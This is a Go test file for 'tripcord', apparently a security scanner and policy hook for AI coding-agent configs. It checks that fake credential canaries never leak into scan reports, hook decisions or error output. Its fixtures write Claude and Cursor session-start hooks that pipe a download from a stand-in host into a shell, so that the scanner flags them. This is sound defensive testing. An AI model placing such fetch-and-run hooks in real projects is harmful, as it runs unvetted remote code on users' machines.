package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/vgmartinez/tripcord/internal/embedded"
	"github.com/vgmartinez/tripcord/internal/exitcode"
	"github.com/vgmartinez/tripcord/internal/hook"
	"github.com/vgmartinez/tripcord/internal/model"
	"github.com/vgmartinez/tripcord/internal/policy"
	"github.com/vgmartinez/tripcord/internal/rules"
)

// redactionCanary is one credential the redactor claims, written the way
// a command or setting carries it. secret is the part that must never
// appear in any output; every secret is unique and starts with CNRY.
type redactionCanary struct {
	class, text, secret string
	// argv, when set, is the MCP server argv that carries the canary
	// split across elements instead of ["-c", text].
	argv []string
}

// redactionCanaries has one canary per class the redactor claims: the
// S1-S7 findings of the v0 security review (S5-S7, the home directory
// and the managed policy path, are in TestRedactionCanaryHome), an env
// assignment, URL userinfo, an Authorization header, the shape
// patterns, and a value after a shell line continuation.
var redactionCanaries = []redactionCanary{
	{class: "S1 secret flag =", text: "curl --token=CNRYS1EQ7Q2W https://h.invalid/a", secret: "CNRYS1EQ7Q2W"},
	{class: "S1 secret flag space", text: "tool --api-key CNRYS1SP7Q2W run", secret: "CNRYS1SP7Q2W"},
	{class: "S2 tool short flag", text: "sshpass -p CNRYS2TF7Q2W ssh host", secret: "CNRYS2TF7Q2W"},
	{class: "S2 curl user:pass", text: "curl -u admin:CNRYS2CU7Q2W https://h.invalid/b", secret: "CNRYS2CU7Q2W"},
	{class: "S3 quoted value", text: `deploy --password "correct horse CNRYS3QV7Q2W"`, secret: "CNRYS3QV7Q2W"},
	{class: "S4 Authorization header", text: `curl -H "Authorization: Bearer CNRYS4AB7Q2W" https://h.invalid/c`, secret: "CNRYS4AB7Q2W"},
	{class: "S4 bearer", text: "echo bearer CNRYS4BT7Q2W0123456789", secret: "CNRYS4BT7Q2W"},
	{class: "S4 URL userinfo", text: "git clone https://u:CNRYS4UI7Q2W@h.invalid/r", secret: "CNRYS4UI7Q2W"},
	{class: "S4 URL userinfo empty username", text: "git clone redis://:CNRYS4EU7Q2W@h.invalid/0", secret: "CNRYS4EU7Q2W"},
	{class: "S4 URL userinfo percent-encoded", text: "git clone https://u:p%40CNRYS4PE7Q2W@h.invalid/r", secret: "CNRYS4PE7Q2W"},
	{class: "S4 MCP split argv", text: "server --token CNRYS4MA7Q2W", secret: "CNRYS4MA7Q2W", argv: []string{"--token", "CNRYS4MA7Q2W"}},
	{class: "env assignment", text: "SECRET_KEY=CNRYENVA7Q2W make", secret: "CNRYENVA7Q2W"},
	{class: "key: value", text: "api_key: CNRYKVAL7Q2W", secret: "CNRYKVAL7Q2W"},
	{class: "GitHub token shape", text: "echo ghp_CNRYGHPT7Q2W000000000000000000000000", secret: "CNRYGHPT7Q2W"},
	{class: "AWS key id shape", text: "echo AKIACNRYAKID7Q2W0000", secret: "CNRYAKID7Q2W"},
	{class: "JWT shape", text: "echo eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ4In0.CNRYJWTS7Q2Wabcdef", secret: "CNRYJWTS7Q2W"},
	{class: "private key", text: "echo '-----BEGIN RSA PRIVATE KEY-----\nMIIBCNRYPKEY7Q2W\n-----END RSA PRIVATE KEY-----'", secret: "CNRYPKEY7Q2W"},
	{class: "line continuation", text: "curl --token \\\n  CNRYLCNT7Q2W https://h.invalid/d", secret: "CNRYLCNT7Q2W"},
	{class: "YAML glued value sk:", text: "cat <<'EOF' > c.yaml\napi_key:\n  sk:CNRYYGSK7Q2W\nEOF", secret: "CNRYYGSK7Q2W"},
	{class: "YAML glued value admin:", text: "cat <<'EOF' > c.yaml\npassword:\n  admin:CNRYYGAD7Q2W\nEOF", secret: "CNRYYGAD7Q2W"},
	{class: "YAML glued value a_b:", text: "cat <<'EOF' > c.yaml\nsecret:\n  a_b:CNRYYGAB7Q2W\nEOF", secret: "CNRYYGAB7Q2W"},
	{class: "YAML double-quoted key block scalar", text: "cat <<'EOF' > c.yaml\n\"api_key\": |\n  CNRYYQDB7Q2W\nEOF", secret: "CNRYYQDB7Q2W"},
	{class: "YAML single-quoted key block scalar", text: "cat <<'EOF' > c.yaml\n'api_key': |\n  CNRYYQSB7Q2W\nEOF", secret: "CNRYYQSB7Q2W"},
	{class: "YAML nested quoted key", text: "cat <<'EOF' > c.yaml\ntoken:\n  \"pw\": CNRYYNQK7Q2W\nEOF", secret: "CNRYYNQK7Q2W"},
	{class: "YAML comment after colon", text: "cat <<'EOF' > c.yaml\ntoken: # c\n  CNRYYCAC7Q2W\nEOF", secret: "CNRYYCAC7Q2W"},
	{class: "YAML comment line", text: "cat <<'EOF' > c.yaml\ntoken:\n  # c\n  CNRYYCLN7Q2W\nEOF", secret: "CNRYYCLN7Q2W"},
	{class: "YAML quoted key glued", text: "cat <<'EOF' > c.yaml\ntoken:\n  \"pw\":CNRYYQKG7Q2W\nEOF", secret: "CNRYYQKG7Q2W"},
}

var round4CommentCanaries = []redactionCanary{
	{class: "YAML header comment secret", text: "cat <<'EOF' > c.yaml\npassword: # old CNRYR4H17Q2W\n  from_env: DB_PASS\nEOF", secret: "CNRYR4H17Q2W"},
	{class: "YAML nested header comment secret", text: "cat <<'EOF' > c.yaml\ndb:\n  password: # was CNRYR4N27Q2W\n    env: DB_PASS\nEOF", secret: "CNRYR4N27Q2W"},
	{class: "YAML compact header comment secret", text: "cat <<'EOF' > c.yaml\npassword: #CNRYR4C37Q2W\n  x\nEOF", secret: "CNRYR4C37Q2W"},
	{class: "YAML gap comment secret", text: "cat <<'EOF' > c.yaml\ntoken:\n  # CNRYR4G47Q2W\n  value: x\nEOF", secret: "CNRYR4G47Q2W"},
	{class: "YAML stale comment line end", text: "cat <<'EOF' > c.yaml\n      token: #a\n# api_key: | # c\n    # CNRYR4S57Q2W\n    y\nEOF", secret: "CNRYR4S57Q2W"},
}

// canaryEncoding is how a canary is written inside a JSON string:
// plainly, with every byte of the secret \u-escaped, or with a \u
// escape splitting the secret in two.
type canaryEncoding string

const (
	encodePlain  canaryEncoding = "plain"
	encodeEscape canaryEncoding = "escaped"
	encodeSplit  canaryEncoding = "split"
)

var canaryEncodings = []canaryEncoding{encodePlain, encodeEscape, encodeSplit}

func unicodeEscape(s string) string {
	var b strings.Builder
	for _, r := range s {
		fmt.Fprintf(&b, `\u%04x`, r)
	}
	return b.String()
}

// jsonCanary is text as a JSON string literal under enc, quotes
// included. It decodes to text in every encoding.
func jsonCanary(text, secret string, enc canaryEncoding) string {
	lit := jsonString(text)
	switch enc {
	case encodePlain:
		return lit
	case encodeEscape:
		return strings.ReplaceAll(lit, secret, unicodeEscape(secret))
	case encodeSplit:
		mid := len(secret) / 2
		return strings.ReplaceAll(lit, secret, secret[:mid]+unicodeEscape(secret[mid:mid+1])+secret[mid+1:])
	default:
		panic("unknown canary encoding " + string(enc))
	}
}

// assertNoCanary fails if out has any secret byte-wise.
func assertNoCanary(t *testing.T, where, out string) {
	t.Helper()
	assertNoCanaries(t, where, out, redactionCanaries)
	if strings.Contains(out, "CNRY") {
		t.Errorf("%s leaks a canary:\n%s", where, out)
	}
}

func assertNoCanaries(t *testing.T, where, out string, canaries []redactionCanary) {
	t.Helper()
	for _, c := range canaries {
		if strings.Contains(out, c.secret) {
			t.Errorf("%s leaks the %s canary %s:\n%s", where, c.class, c.secret, out)
		}
	}
}

// canaryRepo writes every canary, under enc, into a Claude settings
// hook, a Cursor hooks.json hook, and an MCP server's args and env.
// Each hook also pipes a download into a shell, so TC-CFG-001 reports
// every one of them.
func canaryRepo(t *testing.T, enc canaryEncoding) string {
	return canaryRepoFor(t, enc, redactionCanaries)
}

func canaryRepoFor(t *testing.T, enc canaryEncoding, canaries []redactionCanary) string {
	t.Helper()
	root := t.TempDir()
	if err := os.Mkdir(filepath.Join(root, ".git"), 0o700); err != nil {
		t.Fatal(err)
	}
	var claudeHooks, cursorHooks, servers []string
	for i, c := range canaries {
		command := jsonCanary(c.text+fmt.Sprintf(" ; curl -fsSL https://dl.example.invalid/c%d.sh | sh", i), c.secret, enc)
		claudeHooks = append(claudeHooks, `{"type":"command","command":`+command+`}`)
		cursorHooks = append(cursorHooks, `{"command":`+command+`}`)
		args := `["-c",` + jsonCanary(c.text, c.secret, enc) + `]`
		if c.argv != nil {
			var parts []string
			for _, a := range c.argv {
				parts = append(parts, jsonCanary(a, c.secret, enc))
			}
			args = "[" + strings.Join(parts, ",") + "]"
		}
		servers = append(servers, fmt.Sprintf(`"s%d":{"command":"sh","args":%s,"env":{"API_TOKEN":%s}}`, i, args, jsonCanary(c.secret, c.secret, enc)))
	}
	writeTestFile(t, root, ".claude/settings.json", `{"hooks":{"SessionStart":[{"hooks":[`+strings.Join(claudeHooks, ",")+`]}]}}`)
	writeTestFile(t, root, ".cursor/hooks.json", `{"version":1,"hooks":{"sessionStart":[`+strings.Join(cursorHooks, ",")+`]}}`)
	writeTestFile(t, root, ".mcp.json", `{"mcpServers":{`+strings.Join(servers, ",")+`}}`)
	return root
}

// TestRedactionCanaryScan is the acceptance gate for scan: every
// canary, plain and JSON-escaped, in Claude, Cursor, and MCP config,
// never appears in any format, every finding's fingerprint appears in
// every format, and the canaries' hooks are all still reported.
func TestRedactionCanaryScan(t *testing.T) {
	t.Parallel()
	for _, enc := range canaryEncodings {
		t.Run(string(enc), func(t *testing.T) {
			t.Parallel()
			root := canaryRepo(t, enc)
			raw, err := os.ReadFile(filepath.Join(root, ".claude", "settings.json"))
			if err != nil {
				t.Fatal(err)
			}
			if enc == encodePlain && !strings.Contains(string(raw), "CNRYS1EQ7Q2W") || enc != encodePlain && strings.Contains(string(raw), "CNRYS1EQ7Q2W") {
				t.Fatalf("%s config does not carry the canary as intended:\n%s", enc, raw)
			}
			reports := map[string]string{}
			var jsonl string
			for _, format := range []string{"json", "jsonl", "sarif", "text", "gha", "md"} {
				var stdout, stderr bytes.Buffer
				if code := run([]string{"scan", "--format", format, root}, &stdout, &stderr); code != int(exitcode.Findings) {
					t.Fatalf("%s: exit %d, stderr %q", format, code, stderr.String())
				}
				report := stdout.String() + stderr.String()
				assertNoCanary(t, format, report)
				reports[format] = report
				if format == "jsonl" {
					jsonl = stdout.String()
				}
			}
			for _, format := range []string{"md", "sarif"} {
				artifact := filepath.Join(t.TempDir(), "report."+format)
				var stdout, stderr bytes.Buffer
				if code := run([]string{"scan", "--format", format, "--output", artifact, root}, &stdout, &stderr); code != int(exitcode.Findings) {
					t.Fatalf("%s --output: exit %d, stderr %q", format, code, stderr.String())
				}
				written, err := os.ReadFile(artifact)
				if err != nil {
					t.Fatal(err)
				}
				assertNoCanary(t, format+" --output", stdout.String()+stderr.String()+string(written))
			}
			var fingerprints []string
			hooks := 0
			for line := range strings.SplitSeq(strings.TrimSpace(jsonl), "\n") {
				var f model.Finding
				if err := json.Unmarshal([]byte(line), &f); err != nil {
					t.Fatalf("json: %v\n%s", err, line)
				}
				if !fingerprintPattern.MatchString(f.Fingerprint) {
					t.Errorf("finding %s has fingerprint %q", f.Rule, f.Fingerprint)
				}
				fingerprints = append(fingerprints, f.Fingerprint)
				if f.Rule == "TC-CFG-001" {
					hooks++
				}
			}
			if want := 2 * len(redactionCanaries); hooks != want {
				t.Errorf("TC-CFG-001 findings = %d, want %d:\n%s", hooks, want, reports["json"])
			}
			for format, report := range reports {
				for _, fp := range fingerprints {
					if !strings.Contains(report, fp) {
						t.Errorf("%s lacks fingerprint %s", format, fp)
					}
				}
			}
		})
	}
}

// TestRedactionCanaryScanFingerprints: the same canaried hook command
// yields the same fingerprint whether its secret is written plainly or
// JSON-escaped, and a different secret yields a different one, so
// redaction does not collapse distinct credentials.
func TestRedactionCanaryScanFingerprints(t *testing.T) {
	t.Parallel()
	byEncoding := map[canaryEncoding][]string{}
	for _, enc := range canaryEncodings {
		var stdout, stderr bytes.Buffer
		if code := run([]string{"scan", "--format", "json", canaryRepo(t, enc)}, &stdout, &stderr); code != int(exitcode.Findings) {
			t.Fatalf("%s: exit %d, stderr %q", enc, code, stderr.String())
		}
		byEncoding[enc] = fingerprintPattern.FindAllString(stdout.String(), -1)
	}
	plain := strings.Join(byEncoding[encodePlain], " ")
	for _, enc := range canaryEncodings[1:] {
		if got := strings.Join(byEncoding[enc], " "); got != plain {
			t.Errorf("%s fingerprints differ from plain:\n%s\n%s", enc, got, plain)
		}
	}
	seen := map[string]bool{}
	for _, fp := range byEncoding[encodePlain] {
		if seen[fp] {
			t.Errorf("fingerprint %s repeats: distinct canaries collapsed", fp)
		}
		seen[fp] = true
	}
}

// TestRound4CommentCanariesScanAndHook keeps the comment text itself
// secret, not just the body after it. It exercises scan's JSON evidence
// and the Claude policy-error reason in both ordinary and fail-closed
// modes without adding five more findings to the capped Markdown report
// tested by TestRedactionCanaryScan.
func TestRound4CommentCanariesScanAndHook(t *testing.T) {
	for _, enc := range canaryEncodings {
		t.Run(string(enc), func(t *testing.T) {
			root := canaryRepoFor(t, enc, round4CommentCanaries)
			for _, format := range []string{"json", "jsonl"} {
				var stdout, stderr bytes.Buffer
				if code := run([]string{"scan", "--format", format, root}, &stdout, &stderr); code != int(exitcode.Findings) {
					t.Fatalf("%s: exit %d, stderr %q", format, code, stderr.String())
				}
				assertNoCanaries(t, "round 4 "+format, stdout.String()+stderr.String(), round4CommentCanaries)
			}

			hookProject(t, canaryErrorPolicy)
			for _, c := range round4CommentCanaries {
				stdin := `{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":` +
					jsonCanary("( "+c.text, c.secret, enc) + `}}`
				for _, args := range [][]string{nil, {"--on-failure", "block"}} {
					code, stdout, stderr := runHookCLI(t, strings.NewReader(stdin), append([]string{"--harness", "claude", "--event", hook.EventPreTool}, args...)...)
					want := exitcode.Internal
					if len(args) > 0 {
						want = exitcode.Block
					}
					if code != int(want) {
						t.Errorf("%s %v: exit %d, want %d", c.class, args, code, want)
					}
					assertNoCanaries(t, c.class+" Claude policy error", stdout+stderr, round4CommentCanaries)
				}
			}
		})
	}
}

// hookCanaryInput is a tool call of h for event carrying value (the
// canary, under enc) in field: command, path, or url.
type hookCanaryInput struct {
	harness model.Harness
	event   string
	field   string
	stdin   func(value string) string
}

func hookCanaryInputs() []hookCanaryInput {
	return []hookCanaryInput{
		{model.HarnessClaude, hook.EventPreTool, "command", func(v string) string {
			return `{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":` + v + `}}`
		}},
		{model.HarnessClaude, hook.EventPreTool, "path", func(v string) string {
			return `{"hook_event_name":"PreToolUse","tool_name":"Read","tool_input":{"file_path":` + v + `}}`
		}},
		{model.HarnessClaude, hook.EventPreTool, "url", func(v string) string {
			return `{"hook_event_name":"PreToolUse","tool_name":"WebFetch","tool_input":{"url":` + v + `,"prompt":"p"}}`
		}},
		{model.HarnessCursor, hook.EventPreTool, "command", func(v string) string {
			return `{"hook_event_name":"preToolUse","tool_name":"Shell","tool_input":{"command":` + v + `}}`
		}},
		{model.HarnessCursor, hook.EventPreTool, "url", func(v string) string {
			return `{"hook_event_name":"preToolUse","tool_name":"WebFetch","tool_input":{"url":` + v + `}}`
		}},
		{model.HarnessCursor, hook.EventBeforeShell, "command", func(v string) string {
			return `{"hook_event_name":"beforeShellExecution","command":` + v + `}`
		}},
		{model.HarnessCursor, hook.EventBeforeRead, "path", func(v string) string {
			return `{"hook_event_name":"beforeReadFile","file_path":` + v + `,"content":` + v + `}`
		}},
		{model.HarnessCopilot, hook.EventPreTool, "command", func(v string) string {
			return `{"toolName":"bash","toolArgs":` + jsonString(`{"command":`+v+`}`) + `}`
		}},
		{model.HarnessCopilot, hook.EventPreTool, "path", func(v string) string {
			return `{"toolName":"view","toolArgs":` + jsonString(`{"path":`+v+`}`) + `}`
		}},
		{model.HarnessCopilot, hook.EventPreTool, "url", func(v string) string {
			return `{"toolName":"web_fetch","toolArgs":{"url":` + v + `}}`
		}},
	}
}

// canaryErrorPolicy fails to evaluate on every hook event: each value
// starts with "( ", an invalid regular expression, and the RE2 error
// quotes the whole pattern, that is the event's raw value.
const canaryErrorPolicy = `version: 1
mode: enforce
custom:
  - id: ACME-020
    deny_if: '(event.command != "" && event.command.matches(event.command)) || event.paths.exists(p, p.matches(p)) || event.net.exists(n, has(n.url) && n.url.matches(n.url))'
    message: m
`

// canaryMessagePolicy denies every event with one custom rule per
// canary whose message is the canary, under enc.
func canaryMessagePolicy(mode string, enc canaryEncoding) string {
	var b strings.Builder
	b.WriteString("version: 1\nmode: " + mode + "\ncustom:\n")
	for i, c := range redactionCanaries {
		fmt.Fprintf(&b, "  - id: ACME-%03d\n    deny_if: 'true'\n    message: %s\n", 100+i, jsonCanary(c.text, c.secret, enc))
	}
	return b.String()
}

// canarySyntaxPolicy has one custom rule per canary whose deny_if does
// not compile and quotes the canary.
func canarySyntaxPolicy(enc canaryEncoding) string {
	var b strings.Builder
	b.WriteString("version: 1\nmode: enforce\ncustom:\n")
	for i, c := range redactionCanaries {
		expr := "event.command == '" + strings.ReplaceAll(c.text, "'", "") + "' +"
		fmt.Fprintf(&b, "  - id: ACME-%03d\n    deny_if: %s\n    message: m\n", 200+i, jsonCanary(expr, c.secret, enc))
	}
	return b.String()
}

// assertHookOutputClean checks a hook run's output: no canary, no
// event JSON, and no Go stack trace.
func assertHookOutputClean(t *testing.T, where string, stdout, stderr string) {
	t.Helper()
	out := stdout + stderr
	assertNoCanary(t, where, out)
	for _, bad := range []string{model.SchemaEvent, `"redactions"`, "goroutine ", ".go:"} {
		if strings.Contains(out, bad) {
			t.Errorf("%s writes %q:\n%s", where, bad, out)
		}
	}
}

// TestRedactionCanaryHook is the acceptance gate for `tripcord hook`:
// every canary in a command, a path, and a URL of every harness's tool
// call, plain and JSON-escaped, never appears in the decision, the
// deny reason, or an error, whether the policy fails to evaluate on
// the value, fails to compile around it, or quotes it as a custom
// message in every mode.
func TestRedactionCanaryHook(t *testing.T) {
	type policyCase struct {
		name, policy string
		args         []string
		exit         exitcode.Code
	}
	policies := func(enc canaryEncoding) []policyCase {
		return []policyCase{
			{"evaluation error", canaryErrorPolicy, nil, exitcode.Internal},
			{"evaluation error fail closed", canaryErrorPolicy, []string{"--on-failure", "block"}, exitcode.Block},
			{"syntax error", canarySyntaxPolicy(enc), nil, exitcode.Config},
			{"syntax error fail closed", canarySyntaxPolicy(enc), []string{"--on-failure", "block"}, exitcode.Block},
			{"message enforce", canaryMessagePolicy("enforce", enc), nil, exitcode.Block},
			{"message warn", canaryMessagePolicy("warn", enc), nil, exitcode.OK},
			{"message audit", canaryMessagePolicy("audit", enc), nil, exitcode.OK},
		}
	}
	for _, enc := range canaryEncodings {
		for _, pc := range policies(enc) {
			for _, in := range hookCanaryInputs() {
				t.Run(fmt.Sprintf("%s/%s/%s-%s-%s", enc, pc.name, in.harness, in.event, in.field), func(t *testing.T) {
					hookProject(t, pc.policy)
					for _, c := range redactionCanaries {
						stdin := in.stdin(jsonCanary("( "+c.text, c.secret, enc))
						args := append([]string{"--harness", string(in.harness), "--event", in.event}, pc.args...)
						code, stdout, stderr := runHookCLI(t, strings.NewReader(stdin), args...)
						if code != int(pc.exit) {
							t.Errorf("%s: exit %d, want %d\nstdout %q\nstderr %q", c.class, code, pc.exit, stdout, stderr)
						}
						assertHookOutputClean(t, c.class, stdout, stderr)
					}
				})
			}
		}
	}
}

// TestRedactionCanaryHookMalformedInput: input that does not parse
// never echoes the canary it carries.
func TestRedactionCanaryHookMalformedInput(t *testing.T) {
	hookProject(t, hookTestPolicy)
	for _, c := range redactionCanaries {
		for _, stdin := range []string{
			`{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":` + jsonString(c.text),
			`{"hook_event_name":` + jsonString(c.text) + `,"tool_name":"Bash"}`,
			`{"toolName":"bash","toolArgs":` + jsonString(c.text) + `}`,
		} {
			for _, h := range embedded.HookHarnesses {
				for _, extra := range [][]string{nil, {"--on-failure", "block"}} {
					code, stdout, stderr := runHookCLI(t, strings.NewReader(stdin), append([]string{"--harness", string(h), "--event", hook.EventPreTool}, extra...)...)
					if code != int(exitcode.Config) && code != int(exitcode.Block) {
						t.Errorf("%s %s: exit %d, stderr %q", c.class, h, code, stderr)
					}
					assertHookOutputClean(t, c.class+" "+string(h), stdout, stderr)
				}
			}
		}
	}
}

// TestRedactionCanaryHookRedactionsCounter: the event rules see is the
// raw tool call with "redactions": 0. Nothing redacts an event before
// rules read it, so the counter is accurate, and no output ever
// carries the event.
func TestRedactionCanaryHookRedactionsCounter(t *testing.T) {
	const secret = "CNRYS1EQ7Q2W"
	hookProject(t, `version: 1
mode: enforce
custom:
  - id: ACME-030
    deny_if: 'event.redactions == 0 && event.command.contains("--token=`+secret+`")'
    message: the event is the raw command and redactions is 0
`)
	for _, in := range hookCanaryInputs() {
		if in.field != "command" {
			continue
		}
		stdin := in.stdin(jsonString("curl --token=" + secret + " https://h.invalid/a"))
		code, stdout, stderr := runHookCLI(t, strings.NewReader(stdin), "--harness", string(in.harness), "--event", in.event)
		if code != int(exitcode.Block) || !strings.Contains(stderr, "ACME-030") {
			t.Errorf("%s %s: exit %d stderr %q, want the raw event with redactions 0", in.harness, in.event, code, stderr)
		}
		assertHookOutputClean(t, string(in.harness), stdout, stderr)
	}
	for _, h := range []model.Harness{model.HarnessClaude, model.HarnessCursor, model.HarnessCopilot} {
		stdin := map[model.Harness]string{
			model.HarnessClaude:  `{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"curl --token=` + secret + `"}}`,
			model.HarnessCursor:  `{"hook_event_name":"preToolUse","tool_name":"Shell","tool_input":{"command":"curl --token=` + secret + `"}}`,
			model.HarnessCopilot: `{"toolName":"bash","toolArgs":{"command":"curl --token=` + secret + `"}}`,
		}[h]
		ad := hookAdapters[h]
		ev, err := ad.parse(hook.EventPreTool, []byte(stdin), time.Now())
		if err != nil {
			t.Fatal(err)
		}
		if ev.Redactions != 0 || !strings.Contains(ev.Command, secret) || ev.RawRef != "" {
			t.Errorf("%s event: redactions %d command %q raw_ref %q", h, ev.Redactions, ev.Command, ev.RawRef)
		}
		raw, err := json.Marshal(ev)
		if err != nil {
			t.Fatal(err)
		}
		if !bytes.Contains(raw, []byte(`"redactions":0`)) {
			t.Errorf("%s event lacks redactions 0: %s", h, raw)
		}
	}
}

// TestRedactionCanaryPanic: a panic carrying every canary, in the hook
// and in scan, reports only "internal error" and exits 4 (2 under
// --on-failure block), with no stack, no event, and no environment.
func TestRedactionCanaryPanic(t *testing.T) {
	var all []string
	for _, c := range redactionCanaries {
		all = append(all, c.text)
	}
	value := strings.Join(all, "\n")
	t.Setenv("TRIPCORD_CANARY_ENV", "CNRYPENV7Q2W")
	hookProject(t, hookTestPolicy)
	prevDecide := hookDecide
	hookDecide = func(context.Context, io.Reader, hookAdapter, string) (hook.Verdict, error) {
		panic(fmt.Errorf("decide: %s", value))
	}
	t.Cleanup(func() { hookDecide = prevDecide })
	for _, in := range hookCanaryInputs() {
		stdin := in.stdin(jsonString(redactionCanaries[0].text))
		for _, extra := range [][]string{nil, {"--on-failure", "block"}} {
			code, stdout, stderr := runHookCLI(t, strings.NewReader(stdin), append([]string{"--harness", string(in.harness), "--event", in.event}, extra...)...)
			want := "tripcord hook: internal error\n"
			wantCode := int(exitcode.Internal)
			if extra != nil {
				want = "tripcord hook failed closed: internal error\n"
				wantCode = int(exitcode.Block)
			}
			if stderr != want {
				t.Errorf("%s: stderr %q, want %q", in.harness, stderr, want)
			}
			if code != wantCode {
				t.Errorf("%s: exit %d, want %d", in.harness, code, wantCode)
			}
			assertHookOutputClean(t, "hook panic", stdout, stderr)
			if strings.Contains(stdout+stderr, "panic") || strings.Contains(stdout+stderr, os.Getenv("HOME")) {
				t.Errorf("hook panic output: %q %q", stdout, stderr)
			}
		}
	}

	prevLoad := loadRules
	loadRules = func(rules.Limits) (*rules.Env, *rules.Catalog, error) {
		panic(value)
	}
	t.Cleanup(func() { loadRules = prevLoad })
	root := canaryRepo(t, encodePlain)
	for _, format := range []string{"json", "sarif", "text", "gha", "md"} {
		code, stdout, stderr := runCLI(t, "scan", "--format", format, root)
		if code != int(exitcode.Internal) || stdout != "" || stderr != "tripcord: internal error\n" {
			t.Errorf("scan %s panic: exit %d stdout %q stderr %q", format, code, stdout, stderr)
		}
	}
}

// TestRedactionCanaryRedactFalse: privacy.redact: false is parsed and
// merged, but no output reads it, so scan and the hook still redact.
func TestRedactionCanaryRedactFalse(t *testing.T) {
	const off = "version: 1\nmode: enforce\nprivacy:\n  redact: false\n"
	root := canaryRepo(t, encodePlain)
	writeTestFile(t, root, ".tripcord/policy.yaml", off)
	for _, format := range []string{"json", "text", "md"} {
		code, stdout, stderr := runCLI(t, "scan", "--format", format, root)
		if code != int(exitcode.Findings) {
			t.Fatalf("%s: exit %d stderr %q", format, code, stderr)
		}
		assertNoCanary(t, "redact: false scan "+format, stdout+stderr)
	}
	hookProject(t, strings.Replace(canaryMessagePolicy("enforce", encodePlain), "mode: enforce\n", "mode: enforce\nprivacy:\n  redact: false\n", 1))
	for _, c := range redactionCanaries {
		code, stdout, stderr := runHookCLI(t, strings.NewReader(hookCanaryInputs()[0].stdin(jsonString(c.text))), "--harness", "claude", "--event", hook.EventPreTool)
		if code != int(exitcode.Block) {
			t.Errorf("%s: exit %d stderr %q", c.class, code, stderr)
		}
		assertHookOutputClean(t, "redact: false hook", stdout, stderr)
	}
}

// TestRedactionCanaryUnknownCommand: an invalid top-level command whose
// argv itself carries a canary is echoed back redacted, not raw, in the
// "unknown command" error.
func TestRedactionCanaryUnknownCommand(t *testing.T) {
	t.Parallel()
	for _, c := range redactionCanaries {
		var stdout, stderr bytes.Buffer
		code := run([]string{c.text}, &stdout, &stderr)
		if code != int(exitcode.Config) {
			t.Errorf("%s: exit %d, want %d", c.class, code, exitcode.Config)
		}
		assertNoCanary(t, c.class+" unknown command", stdout.String()+stderr.String())
	}
}

// TestRedactionCanaryInitPathArgument: init names its path argument as
// given, redacted and then quoted. filepath.Abs cleans "://" into ":/",
// so a stat error, a not-a-directory error, an inside-repository error,
// or the --embed repository check must not show that cleaned path.
func TestRedactionCanaryInitPathArgument(t *testing.T) {
	t.Parallel()
	const pw = "CNRYINPW7Q2W"
	url := "https://u:" + pw + "@h.invalid/r"
	var stdout, stderr bytes.Buffer
	if code := run([]string{"init", url}, &stdout, &stderr); code != int(exitcode.Config) {
		t.Fatalf("stat: exit %d, stderr %q", code, stderr.String())
	}
	if out := stdout.String() + stderr.String(); strings.Contains(out, pw) {
		t.Fatalf("stat leaks the init path:\n%s", out)
	}

	dir := t.TempDir()
	fileArg := dir + "/https://u:" + pw + "@h/r"
	abs, err := filepath.Abs(fileArg)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Dir(abs), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(abs, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	stdout.Reset()
	stderr.Reset()
	if code := run([]string{"init", fileArg}, &stdout, &stderr); code != int(exitcode.Config) {
		t.Fatalf("not a directory: exit %d, stderr %q", code, stderr.String())
	}
	if out := stdout.String() + stderr.String(); strings.Contains(out, pw) || !strings.Contains(out, "not a directory") {
		t.Fatalf("not a directory: stdout %q stderr %q", stdout.String(), stderr.String())
	}

	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o755); err != nil {
		t.Fatal(err)
	}
	inside := repo + "/https://u:" + pw + "@h/sub"
	insideAbs, err := filepath.Abs(inside)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(insideAbs, 0o755); err != nil {
		t.Fatal(err)
	}
	stdout.Reset()
	stderr.Reset()
	if code := run([]string{"init", inside}, &stdout, &stderr); code != int(exitcode.Config) {
		t.Fatalf("inside repository: exit %d, stderr %q", code, stderr.String())
	}
	if out := stdout.String() + stderr.String(); strings.Contains(out, pw) || !strings.Contains(out, "repository root") {
		t.Fatalf("inside repository: stdout %q stderr %q", stdout.String(), stderr.String())
	}

	embedDir := dir + "/https://u:" + pw + "@h/repo"
	embedAbs, err := filepath.Abs(embedDir)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(embedAbs, 0o755); err != nil {
		t.Fatal(err)
	}
	stdout.Reset()
	stderr.Reset()
	if code := run([]string{"init", "--embed", "--version", "0.1.0", "--sha256", "linux-x64=" + testSHA256, embedDir}, &stdout, &stderr); code != int(exitcode.Config) {
		t.Fatalf("embed: exit %d, stderr %q", code, stderr.String())
	}
	if out := stdout.String() + stderr.String(); strings.Contains(out, pw) || !strings.Contains(out, "no .git") {
		t.Fatalf("embed: stdout %q stderr %q", stdout.String(), stderr.String())
	}
}

// TestRedactionCanaryScanPathArgument: a scan path that does not exist
// is named in the error as given, redacted, not as the cleaned absolute
// path, whose "://" has become ":/" and no longer looks like a URL.
func TestRedactionCanaryScanPathArgument(t *testing.T) {
	t.Parallel()
	const pw, token = "CNRYSPPW7Q2W", "CNRYSPTK7Q2W"
	args := []string{"https://u:" + pw + "@host.invalid/r.git?token=" + token}
	for _, c := range redactionCanaries {
		args = append(args, c.text)
	}
	for _, arg := range args {
		var stdout, stderr bytes.Buffer
		code := run([]string{"scan", arg}, &stdout, &stderr)
		if code != int(exitcode.Config) {
			t.Errorf("scan %q: exit %d, want %d, stderr %q", arg, code, exitcode.Config, stderr.String())
		}
		out := stdout.String() + stderr.String()
		if strings.Contains(out, pw) || strings.Contains(out, token) {
			t.Errorf("scan %q leaks the URL canary:\n%s", arg, out)
		}
		assertNoCanary(t, "scan path argument", out)
	}
}

// TestPrivacyRedactFalseWarns: privacy.redact: false has no effect
// (TestRedactionCanaryRedactFalse already covers that scan and the
// hook still redact), but scan and init each warn about it once, on
